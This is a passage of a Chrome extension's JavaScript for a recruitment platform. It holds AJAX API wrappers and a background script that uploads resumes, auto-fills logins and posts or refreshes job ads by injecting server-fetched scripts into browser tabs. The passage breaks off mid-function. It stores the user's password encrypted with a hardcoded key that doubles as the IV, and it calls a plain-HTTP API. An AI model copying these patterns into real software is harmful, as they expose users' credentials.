	         	callback({code: 500})
	         }
	    };
		$.ajax(settings);
	},"searchJobtitle":function(url, method, args, callback){
		var self = this;
		args.corpCode = api.corpCode;

		var settings={
	         type:method,
	         url:url,
	         dataType: "json",
			 data: args,
			 beforeSend:function(xhr){
  				xhr.setRequestHeader('token', api.token);
  			 },
	         success: function(result){
				if ('00' == result.code) {
					callback({code:200,data:JSON.parse(result.content)});
	         	} else {
	         		callback({code:500,data:[]});
	         	}
	         },
	         error:function(result){
	         	callback({code: 500,data: result.content})
	         }
	    };
		$.ajax(settings);
	},"uploadResume":function(url,method,args,callback) {
		var self = this;
		args.corpCode = api.corpCode;

  		var settings={
  			type:method,
			url:url,
			dataType: "json",
  			data:args,
  			beforeSend:function(xhr){
  				xhr.setRequestHeader('token', api.token);
  			},
	        success: function(result){
				if ('00' == result.code) {
					callback({code:200,data:result.content});
				} else {
	         		callback({code:500,data:result.content});
	         	}
	        },
	        error:function(result){
	        	callback({code:500,data:result.content});
	        }
  		}
  		$.ajax(settings);
	},"checkRepeatResume":function(url,method,args,callback){
		var self = this;
		args.corpCode = api.corpCode;

  		var settings={
  			type:method,
			url:url,
			dataType: "json",
  			data:args,
  			beforeSend:function(xhr){
  				xhr.setRequestHeader('token', api.token);
  			},
	        success: function(result){
	        	console.log(result);
				if ('00' == result.code) {
					callback({code:200,data:result.content});
				} else {
	         		callback({code:500,data:result.content});
	         	}
	        },
	        error:function(result) {
	        	callback({code:500,data:result});
	        }
  		}
  		$.ajax(settings);
	},"getChannelInfo":function(url,method,callback) {
		var settings = {type:method,url:url,dataType: "json",success: function(result) {
			console.log(result);
			if ('00' == result.code) {
				callback({code:200,data:result.content});
			} else {
		         callback({code:500,data:result.msg});
		    }
		 },error:function (result) {
			 callback({code:500,data:result});
		}};
	  	$.ajax(settings);
	},"getHtmlContent":function (url,method,dataType,args,callback) {
		if (typeof url == 'object') {
			var t = +new Date;
			var result = {};
			var requestArray = [];
			$.each(url,function(name,value) {
				requestArray.push($.ajax({type:method,url:value,dataType:dataType,data:args,async:false}));
			});
			var i=0;
			$.each(url,function(name,value) {
				requestArray[i].done(function(data) {
					result[name] = data;
				});
				i++
			});
			$.when(requestArray).done(function() {
				callback({code:200,data:result})
			});
		} else {
			var settings = {type:method,url:url,dataType: dataType,data:args,success: function(result) {
				callback({code:200,data:result});
			 },error:function (result) {
				 callback({code:500,data:result});
			}};
		  	$.ajax(settings);
	  	}
	},"getContentScript":function(url,method,args,callback) {
		args.corpCode = api.corpCode;
		var settings = {type:method,url:url,dataType: "json",data:args,
		beforeSend:function(xhr) {
			xhr.setRequestHeader('token', api.token);
		},success: function(result) {
			if ('00' == result.code) {
				callback({code:200,data:result.content});
			} else {
				callback({code:500,data:result.msg});
			}
		 },error:function (result) {
			 callback({code:500,data:result});
		}};
	  	$.ajax(settings);
	},"getAdList":function(url,method,args,callback) {
		args.corpCode = api.corpCode;
  		var settings= {
  			type:method,
			url:url,
			dataType: "json",
  			data:args,
  			beforeSend:function(xhr) {
  				xhr.setRequestHeader('token', api.token);
  			},
	        success: function(result) {
	        	//console.log(result);
				if ('00' == result.code) {
					callback({code:200,data:result.content});
				} else {
	         		callback({code:500,data:result.content ? result.content: result.msg});
	         	}
	        },
	        error:function(result) {
	        	callback({code:500,data:result});
	        }
  		}
  		$.ajax(settings);
	},"getAdDetail":function(url,method,args,callback) {
		args.corpCode = api.corpCode ;
  		var settings= {
  			type:method,
			url:url,
			dataType: "json",
  			data:args,
  			beforeSend:function(xhr) {
  				xhr.setRequestHeader('token', api.token);
  			},
	        success: function(result) {
	        	console.log(result);
				if ('00' == result.code) {
					callback({code:200,data:result.content});
				} else {
	         		callback({code:500,data:result.content ? result.content: result.msg});
	         	}
	        },
	        error:function(result) {
	        	callback({code:500,data:result});
	        }
  		}
  		$.ajax(settings);
	},"updatePublishTag":function(url,method,args,callback) {
		args.corpCode = api.corpCode;
  		var settings= {
  			type:method,
			url:url,
			dataType: "json",
  			data:args,
  			beforeSend:function(xhr) {
  				xhr.setRequestHeader('token', api.token);
  			},
	        success: function(result) {
	        	//console.log(result);
				if ('00' == result.code) {
					callback({code:200,data:result.content});
				} else {
	         		callback({code:500,data:result.msg});
	         	}
	        },
	        error:function(result) {
	        	callback({code:500,data:result});
	        }
  		}
  		$.ajax(settings);
	},'getLastVersion':function(url,method,args,callback) {
		args.corpCode = api.corpCode;
  		var settings= {
  			type:method,
			url:url,
			dataType: "text",
  			data:args,
  			beforeSend:function(xhr) {
  				xhr.setRequestHeader('token', api.token);
  			},
	        success: function(result) {
				callback({code:200,data:result});
	        },
	        error:function(result) {
	        	callback({code:500,data:result});
	        }
  		}
  		$.ajax(settings);
	},
	/*'getChannelListInfo':function(url,method,args,callback){
		args.corpCode = api.corpCode;
  		var settings= {
  			type:method,
			url:url,
			dataType: "json",
  			data:args,
  			beforeSend:function(xhr) {
  				xhr.setRequestHeader('token', api.token);
  			},
	        success: function(result) {
	        	//console.log(result);
				if ('00' == result.code) {
					callback({code:200,data:result.content});
				} else {
	         		callback({code:500,data:result.content ? result.content: result.msg});
	         	}
	        }
  		}
  		$.ajax(settings);
	},*/
	'updateRefreshTag':function(url,method,args,callback){
		args.corpCode = api.corpCode;
  		var settings= {
  			type:method,
			url:url,
			dataType: "json",
  			data:args,
  			beforeSend:function(xhr) {
  				xhr.setRequestHeader('token', api.token);
  			},
	        success: function(result) {
				if ('00' == result.code) {
					callback({code:200,data:result.content});
				} else {
	         		callback({code:500,data:result.content ? result.content: result.msg});
	         	}
	        }
  		}
  		$.ajax(settings);
	}
	
}

// original file:demos/jianlibao/js/bg/background.js

var appKey = "vuUJLULu4GGszgny";
var version = '1.24'; // 获取插件版本
var isOnline = true;
var serverBaseUrl = isOnline ? "http://api.wintalent.cn/wt":"http://localhost:8089/wt";
var requestUrlMap = {login:'/tds/auth/authorizelogin',searchJob:'/tds/post/channelDownloadJobList',uploadResume:'/tds/channel/importResume',checkRepeatResume:'/tds/channel/checkRepeatResume',checkRelevantPerson:'/tds/channel/checkRepeatResume!checkRelatedResume',channelInfo:'/tds/channel/getChannelInfo',getChannelScript:'/tds/channel/getChannelScript',getAdList:'/tds/channel/getAdList',getAdDetail:'/tds/channel/getAdDetail',updatePublishTag:'/tds/channel/updateChannelPublishTag',getLastVersion:'/tds/channel/pluginInfo!getPluginVersion',downloadPlugin:'/tds/channel/pluginInfo!downloadPlugin',updateRefreshTag:'/tds/channel/updateRefreshTag'};

var storage = window.localStorage;
var api = new DayeeAPI(appKey, serverBaseUrl);

var downloadScriptKey = 'downloadScript',adPublishScriptKey = 'adPublishScript';
var channelConfigInfo = {};// 域名、以及各种url
var delayed = true;//用来延时使用
//根据key获取channelInfo
function getChannelInfoByKey(tabId,dic,net,callback){
	var param =  {k:'channelDicId',v:dic}
	if($.trim(net).length>0){
		getChannelScript(adPublishScriptKey,dic,function(script){
			var jscode = "var _adInfo ={};\r\n"+script + "\r\n channelKeys.get("+dic+","+net+");"
			chrome.tabs.executeScript(tabId, {code: jscode}, function(res){
				if(res[0]){
					param = {k:'channelKey',v:res[0]}
				}
				getChannelInfo(param.k, param.v, function(channelInfo){
					callback(channelInfo)
				})
			});
		});
	}else {
		getChannelInfo(param.k, param.v, function(channelInfo){
					callback(channelInfo)
		})	
	}
}

//requestMsg . sender , response
function onMessage(requestMsg,sender,callback) {
	switchMessageHandle(requestMsg,callback,requestMsg.type);
	return true;
}
chrome.extension.onMessage.addListener(onMessage);

//监听页面变化（自动填充账号密码、职位信息）
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
	//if (changeInfo.status == "complete"）
	if (tab.status != 'complete') {
		return;
	}

	// 搜索简历
	/*var _currentUrl = tab.url;
	if (/\/wt\/talentPool\/channel\/(job|zhaopin|lietou)\/listResume\?channelDicId=/i.test(_currentUrl)) {
		console.log('dayee');
		$('#dySearch').show();
	}*/
	var _currentUrl = tab.url;
	var _old = _mapUtils.get('searchTabsInfo');
	var _preTabIdInfo = _old['searchTabId_'+tabId];
	if (_preTabIdInfo) {

		//_old['searchTabId_'+tabId] = {'preTabId':tabId,'channelDicId':channelInfo.channelDicId};
		getChannelInfoByKey(tabId,_preTabIdInfo.channelDicId,_preTabIdInfo.netRecruitment, function(channelInfo) {

			var _loginPageRegx = channelInfo['loginPageRegx'];
			if (_isUseable(_loginPageRegx) && new RegExp(_loginPageRegx, 'i').test(_currentUrl)) {
				var _jscode = "function _getAccountInfo(){var _info= $('#dySearchGetAccountUrl').attr('data-accountinfo');if(!_info){_info=top.window['data-accountInfo']} return _info;}\r\n;_getAccountInfo();";
				chrome.tabs.executeScript(_preTabIdInfo.preTabId, {code: _jscode}, function(resp) {
					if (resp && resp[0] != null) {
						var _searchAccountInfo = JSON.parse(resp[0]);
						getChannelScript(adPublishScriptKey,channelInfo.channelDicId,function(loginScript) {
							var jscode = "var _adInfo = " + JSON.stringify(_searchAccountInfo) + ";\r\n"+loginScript;
//							console.log(jscode);
							chrome.tabs.executeScript(tabId, {code: jscode}, function(res) {
								// 
							});
						});
					}
				});
			}
			// 登录成功到首页后，是否自动跳转到搜索页面
			var _homePageRegx = channelInfo['homePageRegx'];
			if (_isUseable(_homePageRegx) && new RegExp(_homePageRegx, 'i').test(_currentUrl)) {
				// 跳到搜索页面
				chrome.tabs.update(tabId,{url:channelInfo["searchAddr"]},function(res){
	
				});
			}
		});
	}//搜索 end

	// 发布相关
	if ($.inArray(tabId, _adTabUtils.get()) >= 0) {
		var publishInfo = _mapUtils.get('detail-'+tabId);
		if (publishInfo == null) {
			return;
		}
		getChannelInfoByKey(tabId,publishInfo.channelDicId,publishInfo.netRecruitment, function(channelInfo) {

			// 发布填充职位信息 （如果账号未登录，那么会调到登录页，需要自动填充账号信息；）
			var _publishFillPageRegx = channelInfo['publishFillPageRegx'];
			var _loginPageRegx = channelInfo['loginPageRegx'];
			if ((_isUseable(_publishFillPageRegx) && new RegExp(_publishFillPageRegx, 'i').test(_currentUrl)) ||
				(_isUseable(_loginPageRegx) && new RegExp(_loginPageRegx, 'i').test(_currentUrl))
				) {

				getChannelScript(adPublishScriptKey,publishInfo.channelDicId,function(adPublishScript) {
					var jscode = "var _adInfo = " + JSON.stringify(publishInfo) + ";\r\n" + adPublishScript;
					chrome.tabs.executeScript(tabId, {code: jscode}, function(res) {
						// 
					});
				});
			}

			// 登录成功到首页后，是否自动跳转到发布页面
			var _homePageRegx = channelInfo['homePageRegx'];
			if (_isUseable(_homePageRegx) && new RegExp(_homePageRegx, 'i').test(_currentUrl)) {
				// 跳到发布页面
				chrome.tabs.update(tabId,{url:channelInfo["publishAddr"]},function(res){
	
				});
			}
			// 发布成功页 start
			// if(/(https|http):\/\/jobads\.zhaopin\.com\/Position\/Result/.test(pageUrl)) {// 发布成功页面
			var _publishSuccessPageRegx = channelInfo['publishSuccessPageRegx'];
			if (_isUseable(_publishSuccessPageRegx) && new RegExp(_publishSuccessPageRegx, 'i').test(_currentUrl)) {
	        	getChannelScript(adPublishScriptKey,publishInfo.channelDicId,function(adPublishScript) {
					var jscode = "var _adInfo = " + JSON.stringify(publishInfo) + ";\r\n" + adPublishScript;
					chrome.tabs.executeScript(tabId, {code: jscode + ";\r\n_getChannelPublishSign();"}, function(resp) {
						if (resp && resp[0] != null) {
							_handlePublishSuccessPage(tabId,resp[0],channelInfo,publishInfo)
						} 
					});
				});
	        }
        });// 发布成功页 end
	}
	//去简历详情页
    var _resumeInfo = _mapUtils.get('resumeInfo_'+tabId);
    if(!$.isEmptyObject(_resumeInfo)) {
        var _loginPageRegx = _resumeInfo['loginPageRegx'];
        //登录
        if ((_isUseable(_loginPageRegx) && new RegExp(_loginPageRegx, 'i').test(_currentUrl))
        ) {
            getChannelScript(adPublishScriptKey,_resumeInfo.channelDicId,function(script) {
                var jscode = "var _adInfo = " + JSON.stringify(_resumeInfo) + ";\r\n" + script;
                chrome.tabs.executeScript(tabId, {code: jscode}, function(res) {
                })
            });
        }
        // 登录成功到首页后，是否自动跳转到发布页面
        var _homePageRegx = _resumeInfo['homePageRegx'];
        if (_isUseable(_homePageRegx) && new RegExp(_homePageRegx, 'i').test(_currentUrl)) {
            // 跳到发布页面
            chrome.tabs.update(tabId,{url:_resumeInfo.url},function(res){

            });
        }
    }
    //刷新，暂停，关闭，二次发布页面
	var _stopTabId = _mapUtils.get('stopTabsInfo');
	var _preStopTabIdInfo = _stopTabId['stopTabId_'+tabId];
	if(_preStopTabIdInfo){
		var stopRefreshInfo = _mapUtils.get('stop_'+tabId);
		if (stopRefreshInfo == null) {
			return;
		}
		var refreshOrginIdArray =  _mapUtils.get('refreshOrginIdList_'+tabId);
//		var refreshTreatedResume = _mapUtils.get('treatedResumeId_'+tabId);
		getChannelInfoByKey(tabId,stopRefreshInfo.channelDicId,stopRefreshInfo.netRecruitment, function(channelInfo) {

			// 发布填充职位信息 （如果账号 登录，那么会调到登录页，需要自动填充账号信息；）
			var _stopPageRegx = channelInfo['stopOrRefreshPage'];
			var _loginPageRegx = channelInfo['loginPageRegx'];
			if ((_isUseable(_loginPageRegx) && new RegExp(_loginPageRegx, 'i').test(_currentUrl))
				) {
				getChannelScript(adPublishScriptKey,stopRefreshInfo.channelDicId,function(adPublishScript) {
					var jscode = "var _adInfo = " + JSON.stringify(stopRefreshInfo) + ";\r\n" + adPublishScript;
					chrome.tabs.executeScript(tabId, {code: jscode}, function(res) {

					})

				});

			}
            // 登录成功到首页后，跳转到职位列表页
            var _homePageRegx = channelInfo['homePageRegx'];
            if (_isUseable(_homePageRegx) && new RegExp(_homePageRegx, 'i').test(_currentUrl)) {
                chrome.tabs.update(tabId,{url:channelInfo["stopOrRefreshPage"]},function(res){

                });
            }
			//职位列表页面 获取职位唯一标识以及更新时间
			var _stopRefreshPageRegx = channelInfo['stopOrRefreshPageRegx'];
			if((_isUseable(_stopRefreshPageRegx) && new RegExp(_stopRefreshPageRegx, 'i').test(_currentUrl)) && !(new RegExp(_loginPageRegx, 'i').test(_currentUrl))){
				//目前只有刷新是更改标识，暂停，关闭等不回填系统状态
				var refreshType = stopRefreshInfo.refreshType;
				if(refreshType == 6||refreshType == 2){//刷新或者暂停
					var isOptRefresh = _mapUtils.get('isOptRefresh_'+tabId);//刷新，暂停时使用，用来判断当前页是搜寻还是刷新或暂停操作
					var isShowScuuceeTip = _mapUtils.get('isShowScuuceeTip_'+tabId);//是否展示刷新或暂停结果
					var isAutoRefresh = _mapUtils.get('isAutoRefresh_'+tabId);//是否自动刷新
					var originIds = JSON.parse(_mapUtils.get('optInfo_'+tabId));//需要自动处理的职位信息  json数组
					var totalNum = stopRefreshInfo.dytotalNum;//总处理数
					var optNum = _mapUtils.get('optNum_'+tabId);//剩余处理
					console.log(originIds[0]);
					var originLength = getHsonLength(originIds);
					if(isAutoRefresh){//自动刷新
						if(originLength>0){
							var originInfo = JSON.stringify(originIds[0]);//获取到你当前处理的职位信息
							optNum = totalNum -optNum +1;//正在处理第几个
							getChannelScript(adPublishScriptKey,stopRefreshInfo.channelDicId,function(adPublishScript) {
								var jscode = "var _adInfo = {};\r\n" + adPublishScript;
								/**
								 * 由于智联搜索职位是ajax，51，猎聘，拉钩搜索都会二次触发插件。所以分成两种情况进行处理。
								 * 如果是智联，插件会先执行搜索，然后根据搜索出来的内容，在进行刷新暂停等操作。
								 * 如果是其他渠道，则是根据一个标识判断当前是执行的操作是搜索还是刷新操作。如果执行的是搜索操作那么就触发搜索的脚本，如果是刷新等操作则触发相应的脚本。
								 * */
								if(stopRefreshInfo.channelDicId == 2){//搜索职位异步加载的
									//先搜到职位信息
									chrome.tabs.executeScript(tabId, {code: jscode + ";\r\_refreshPostInfoList("+originInfo+","+totalNum+","+optNum+","+false+","+refreshType+");"}, function(resp) {
										
									});
									//等待3000毫秒，待搜索到职位信息后，再进行自动刷新
									setTimeout(function(){
										chrome.tabs.executeScript(tabId, {code: jscode + ";\r\_refreshPostInfoList("+originInfo+","+totalNum+","+optNum+","+true+","+refreshType+");"}, function(resp) {
											if(true){
												delete originIds[0];
												changeJson(originIds,tabId);
											}
											if(resp && !resp[0]){//自动刷新失败
												var falseOriginInfo = JSON.parse(originInfo);
												var falseInfo = JSON.parse(_mapUtils.get('falseOptInfo_'+tabId));
												var falseLength = getHsonLength(falseInfo);
												if(!isExisFalseOpt(falseInfo,falseOriginInfo)){
													falseInfo[falseLength] = falseOriginInfo;
													_mapUtils.put('falseOptInfo_'+tabId, JSON.stringify(falseInfo));
												}
											}else{//自动刷新成功
												var falseOriginInfo = JSON.parse(originInfo);
												var falseInfo = JSON.parse(_mapUtils.get('successOptInfo_'+tabId));
												var falseLength = getHsonLength(falseInfo);
												falseInfo[falseLength] = falseOriginInfo;
												_mapUtils.put('successOptInfo_'+tabId, JSON.stringify(falseInfo));
											}
										});
									},3000);
								}else{//搜索刷新页面触发插件的,由于每次搜索都触发插件，不能判定是搜索，还是刷新操作，所以isOptRefresh做了一个记录，true代码
									chrome.tabs.executeScript(tabId, {code: jscode + ";\r\_refreshPostInfoList("+originInfo+","+totalNum+","+optNum+","+isOptRefresh+","+refreshType+");"}, function(resp) {
										if(isOptRefresh){
											delete originIds[0];
											changeJson(originIds,tabId);
										}
										if(resp && !resp[0]){//自动刷新失败
											var falseOriginInfo = JSON.parse(originInfo);
											var falseInfo = JSON.parse(_mapUtils.get('falseOptInfo_'+tabId));
											var falseLength = getHsonLength(falseInfo);
											if(!isExisFalseOpt(falseInfo,falseOriginInfo)){
												falseInfo[falseLength] = falseOriginInfo;
												_mapUtils.put('falseOptInfo_'+tabId, JSON.stringify(falseInfo));
											}
										}else{//自动刷新成功
											var falseOriginInfo = JSON.parse(originInfo);
											var falseInfo = JSON.parse(_mapUtils.get('successOptInfo_'+tabId));
											var falseLength = getHsonLength(falseInfo);
											falseInfo[falseLength] = falseOriginInfo;
											_mapUtils.put('successOptInfo_'+tabId, JSON.stringify(falseInfo));
										}
										_mapUtils.put('isOptRefresh_'+tabId, !isOptRefresh);
									});
								}
							})
						}else if(isShowScuuceeTip){//展示刷新结果
							var falseInfo = JSON.parse(_mapUtils.get('falseOptInfo_'+tabId));
							var falseLength = getHsonLength(falseInfo);
							var successOptInfo = JSON.parse(_mapUtils.get('successOptInfo_'+tabId));
							var successOptLength = getHsonLength(successOptInfo);
							if(successOptLength>0){
								var updateTag = {};
								$.each(successOptInfo,function(i,item){
									updateTag[i] = {"orginId":item.originId};
								})
								if(refreshType == 6){
									refresh(stopRefreshInfo,updateTag);
								}
								var successOpt = {};
								_mapUtils.put('successOptInfo_'+tabId, JSON.stringify(successOpt));
							}
							getChannelScript(adPublishScriptKey,stopRefreshInfo.channelDicId,function(adPublishScript) {
								console.log("去除系统发布成功的渠道信息");
								var channelId = stopRefreshInfo.channelId;
								var refreshOldTabId = stopRefreshInfo.adStopTabId;
								var _dListCode = adPublishScript +'\r\n'+  "_refreshFinishCode("+channelId+")" ;
								chrome.tabs.executeScript(refreshOldTabId,{code:_dListCode},function(res) {
									console.log('remove %s',channelId);
								});
								//展示系统自动刷新的结果 全部刷新完成或者提示失败职位信息
								var jscode = "var _adInfo = {};\r\n" + adPublishScript;
								chrome.tabs.executeScript(tabId, {code: jscode + ";\r\_showTips("+JSON.stringify(falseInfo)+","+totalNum+","+refreshType+");"}, function(resp) {
									if(resp && resp[0]){
										_mapUtils.put('isShowScuuceeTip_'+tabId, false);
									}
								});
							})
							_mapUtils.put('isAutoRefresh_'+tabId, false);
						}
					}else{//手动刷新
						if(isShowScuuceeTip){//展示刷新失败的职位信息。
							var falseInfo = JSON.parse(_mapUtils.get('falseOptInfo_'+tabId));
							if(getHsonLength(falseInfo)>0){
								getChannelScript(adPublishScriptKey,stopRefreshInfo.channelDicId,function(adPublishScript) {
									var jscode = "var _adInfo = {};\r\n" + adPublishScript;
									chrome.tabs.executeScript(tabId, {code: jscode + ";\r\_showTips("+JSON.stringify(falseInfo)+","+totalNum+","+refreshType+");"}, function(resp) {
										if(resp && resp[0]){
											_mapUtils.put('isShowScuuceeTip_'+tabId, false);
										}
									});
								});
							}
						}
						//检测页面刷新的外网职位
						if (stopRefreshInfo && stopRefreshInfo.refreshType && stopRefreshInfo.refreshType == 6) {
							getChannelScript(adPublishScriptKey,stopRefreshInfo.channelDicId,function(adPublishScript) {
								var delayTime = 0;
								var jscode = "var _adInfo = {};\r\n" + adPublishScript;
								chrome.tabs.executeScript(tabId, {code: jscode + ";\r\_getChannelPostInfoList();"}, function(resp) {
									if(resp != null && resp[0] != null){
										passiveRefresh(tabId,resp,refreshOrginIdArray,stopRefreshInfo);
									}
								});
							});
						}
					}
				}
			}
		});
	}
});

function _handlePublishSuccessPage(tabId,tag,channelInfo,publishInfo){
	var _channelKey = channelInfo['key'];
	if(_channelKey == 'zhaopin0' || _channelKey == 'zhaopin5'){
		_channelKey = 'zhaopin'
	}
	var _successKey = _channelKey+'_'+tag;
	if($.inArray(_successKey, _publishSuccessTagList)>=0){

	} else {
		_publishSuccessTagList.push(_successKey);
	
		// 维护发布标识；完成后清除缓存数据；刷新之前的页面，或修改标识
		console.log('职位%s发布成功，发布标识是%s',publishInfo['postCode'],tag);

		_adTabUtils.remove(tabId);
		_mapUtils.remove('detail-' + tabId);

		_messageNotice({channelKey:channelInfo['channelDicId']+'_logo',
						title:'职位发布成功！',
						message:'您的职位【'+publishInfo['postName']+'】已成功发布到'+channelInfo['channelName'],
						time:10000
		});
		var _adPublishTabId = publishInfo['adPublishTabId'];
		if (_adPublishTabId) {
			getChannelScript(adPublishScriptKey,publishInfo.channelDicId,function(adPublishScript) {
				var _cid = publishInfo['channelId'];
				var type = publishInfo['refreshType'];
				var _dListCode = '$("tr.table-tr[data-index='+_cid+']").remove();';
				_dListCode += "try{$('#afterPluginOptFinish')[0].click();}catch(error){console.log('afterPluginOptFinish execte fail');}";
				if(type == 5){
					var postId = publishInfo['postid'];
					var uid = publishInfo['uid'];
					_dListCode = adPublishScript+ '\r\n' + "_postSuccessCode('"+postId+"','"+uid+"')" + '\r\n';
				}
				chrome.tabs.executeScript(_adPublishTabId,{code:_dListCode},function(res) {
					console.log('remove %s',publishInfo['channelId']);
				});
			})
		}

		var publishTagObj = {tag:tag,postId:publishInfo['postid'],uid:publishInfo['uid'],externalKey:publishInfo['externalKey']};

		api.updatePublishTag(getRequestUrl('updatePublishTag'),'post',publishTagObj,function(res) {
			if (res.code == 200) {
				_clearPublishSuccessTag(_successKey);
				console.log('职位%s发布成功，发布标识是%s，成功同步标识',publishInfo['postCode'],tag);
			} else {
				var toSynchObj = $.extend(publishTagObj,{postCode:publishInfo['postCode'],time:new Date(),corp:api.corpCode,postName:publishInfo['postName'],channelKey:channelInfo['key'],channelName:channelInfo['channelName']});
				_toSynPusblishTagList.push(toSynchObj);
			}
		});
	}
}
function _clearPublishSuccessTag(_successKey) {
	if (_isUseable(api.corpCode)) {
		$(_publishSuccessTagList).each(function(i,item){
			if(_successKey == item) {
				_publishSuccessTagList.splice(i,1);
			}
		});
	}
}

var _toSynPusblishTagList = [],_publishSuccessTagList=[];
var _isRunning = false;
setInterval(function() {
	if(_isRunning || !_isUseable(api.corpCode)) {
		
	} else if(_toSynPusblishTagList.length>0) {
		_isRunning = true;
		
		console.log('start interval publish tag:');

		$(_toSynPusblishTagList).each(function(i,item) {
			if (api.corpCode == item['corp']) {
				if ((+new Date - item['time'])<6*3600e3) {
					var publishTagObj = {tag:item['tag'],postId:item['postId'],uid:item['uid'],externalKey:item['externalKey']}; 
					api.updatePublishTag(getRequestUrl('updatePublishTag'),'post',publishTagObj,function(res) {
						if (res.code == 200) {
							_toSynPusblishTagList.splice(i,1);
							_clearPublishSuccessTag(item['channelKey'] +'_'+ item['tag']);
							console.log('职位%s发布成功，发布标识是%s，成功同步标识',item['postCode'],item['tag']);
						} else {
							item['time'] = new Date();
						}
					});
				} else {
					_toSynPusblishTagList.splice(i,1);
				}
			}
		});
		_isRunning = false;
	}
},10*1000);

// 监听tab关闭 （）
chrome.tabs.onRemoved.addListener(function (tabId,removeInfo) {
	// debugger;
	// {isWindowClosing:false,windowId:42}
	//console.log("tab %s closed！",tabId);
	// 移除 （发布成功还未取到标识的不删 TODO）
	_adTabUtils.remove(tabId);
	_mapUtils.remove('detail-' + tabId);
	_mapUtils.remove('stop_' + tabId);
	_mapUtils.remove('optInfo_' + tabId);
	_mapUtils.remove('optNum_' + tabId);
	_mapUtils.remove('falseOptInfo_'+tabId);
	_mapUtils.remove('successOptInfo_'+tabId);
	_mapUtils.remove('isOptRefresh_'+tabId);
	_mapUtils.remove('isShowScuuceeTip_'+tabId);
	_mapUtils.remove('isAutoRefresh_'+tabId);
	_mapUtils.remove('refreshOrginIdList_'+tabId);
	_mapUtils.remove('resumeInfo_' + tabId);
	var _old = _mapUtils.get('searchTabsInfo');
	delete _old['searchTabId_'+tabId];
	_mapUtils.put('searchTabsInfo',_old);
	//移除刷新，二次发布，暂停
	var _stopOld = _mapUtils.get('stopTabsInfo');
	delete _stopOld['stopTabId_'+tabId];
	_mapUtils.put('stopTabsInfo', _stopOld);
});

function switchMessageHandle(request,sendResponse,type) {
	var types= {
		"logOff":function() { //退出
			api.logOff(function(){
				sendResponse();
			});
		},"checkLogin":function() { //查看登录状态
			api.checkLogin(function(data) {
				if(request.corpCode != null && request.userName != null){
					chrome.storage.local.get([appKey],function(res) {
						var userData = res[appKey] ? JSON.parse(res[appKey]) : {};
						if(userData.corpCode && userData.userName){
							if(userData.corpCode != request.corpCode||userData.userName != request.userName){
								data.code = false;
							}
						}
						sendResponse(data);
					});
				}else{
					sendResponse(data);
				}
				
				/*if (data.code) {
					sendResponse(data);
				} else {
					chrome.storage.local.get([appKey],function(res) {
						var cacheData = {};
						if (res[appKey]) {
							cacheData = JSON.parse(res[appKey]);
						}
						if(cacheData.corpCode) {
							data.data.corpCode = cacheData.corpCode;
						}
						if(cacheData.userName) {
							data.data.userName = cacheData.userName;
						}
						sendResponse(data);
					});
					var localAccountInfo = storage[appKey];
					var cacheData = {};
					if (typeof(localAccountInfo)=="undefined") {
						cacheData= {};
					} else {
						cacheData = JSON.parse(localAccountInfo);
					}
					if(cacheData.corpCode)data.data.corpCode = cacheData.corpCode;
					if(cacheData.userName)data.data.userName = cacheData.userName;
				}*/
			});
		},"login":function() { // 登录
			request.loginUrl = serverBaseUrl + requestUrlMap['login'];
			api.login(request,function(data) {
				var keys = CryptoJS.enc.Utf8.parse(appKey.slice(0, 16));
				var pwd = CryptoJS.AES.encrypt(request.password, keys, {iv: keys,mode: CryptoJS.mode.CBC,padding: CryptoJS.pad.Pkcs7}).toString();
				var storageData= {"corpCode":request.corpCode,"userName":request.userName,"password":pwd,"autoFill":request.autoFill};
				//storage[appKey] = JSON.stringify(storageData);
				chrome.storage.local.set({"vuUJLULu4GGszgny":JSON.stringify(storageData)}, function(items) {
					// set 不能用appKey
					console.log("用户名缓存成功！");
				});
				sendResponse(data);
			});
		},"setPeference":function() { //设置用户偏好
            chrome.storage.local.get(["peference"],function(res) {
                var peference = res["peference"] ? JSON.parse(res["peference"]) : {};
                var param = request.param
				for(k in param){
                    peference[k] = param[k]
				}
                console.log('---setPeference---')
                console.log('peference',peference)
            	chrome.storage.local.set({"peference":JSON.stringify(peference)},function () {})
            })
		},"getPeference":function() { //用户偏好
            chrome.storage.local.get(["peference"],function(res) {
                var peference = res["peference"] ? JSON.parse(res["peference"]) : {};
				var keylist = request.key
				var data = {}
				$.each(keylist,function (i,e) {
                    data[e] = peference[e]
                })
				console.log('---getPeference---')
                console.log('返回data',data)
                sendResponse(data)
			})
		},"searchJobList":function() { //搜索职位
			/*if($.trim(request.keyword)==""){
				var data=getLocalJobtitle();
				sendResponse(data);
				return;
			}*/
			var url = api.serverBaseUrl + requestUrlMap['searchJob'];
			var args={
				keyword:request.keyword,
				recruitType:2
			};
			api.searchJobtitle(url,"post",args,function(data) {
				sendResponse(data.data);
			});
		},"uploadResume":function() { //上传简历
			var url = api.serverBaseUrl + requestUrlMap['uploadResume'];
			
			var args = $.extend({}, request);
			/*var args = {
				channelId: request.channelId,
				channelDicId: request.channelDicId,
	           	resumeContent: request.resumeContent,
	           	encoding : request.encoding,
			  	language: request.language,
			  	postIdList: request.postIdList,
				resumeOriginalId: request.resumeOriginalId,
				applyStatus: request.applyStatus,
			  	resumeWhereabouts:request.resumeWhereabouts,
			  	key:request.key
			};

			if (args.files) {
				for (var i=0;i<args.files.length;i++) {
					var file = args.files[i];
					$.each(file,function(name,value) {
						args['files['+i+'].'+name] = value;
					})
				}
			}*/
			rebulidRequestParms(args);

			api.uploadResume(url,"post",args,function(data) {
				//saveLocalJobtitle(request);
				sendResponse(data);
				//var localResumeInfo={"syncId":data.data,"importState":2,"resumeTitle":request.resumeTitle,"channelImgUrl":request.channelImgUrl};
				//map.insert(localResumeInfo);
				//createNotification(localResumeInfo);
			});
		},"uploadAttachmentFile": function() { //http://www.thinksaas.cn/topics/0/603/603295.html、https://developer.chrome.com/extensions/downloads
            chrome.downloads.download({
                url: request.downloadurl,
                conflictAction: 'uniquify',//conflictAction的值只能为uniquify(在文件名后面添加带括号的序号，以保证文件名唯一)，overwrite(覆盖)或者prompt(给出提示，让用户自行决定是对文件进行重命名还是将其覆盖、)
                method: 'GET'
            }, function(downloadId) {
                chrome.downloads.onChanged.addListener(function(resp) {
                    if (downloadId == resp.id && typeof(resp.filename) != "undefined" && resp.filename.current != "") {
                        var file = resp.filename.current.split('\\').pop();
                        var fileType = file.split('.').pop();
                        
                        var xhr = new XMLHttpRequest();
                        xhr.open('GET', request.downloadurl, true);
                        xhr.responseType = "blob";
                        xhr.onload = function() {
                            if (this.status == 200) {
                                var blob = this.response;
                                var fileReader = new window.FileReader();
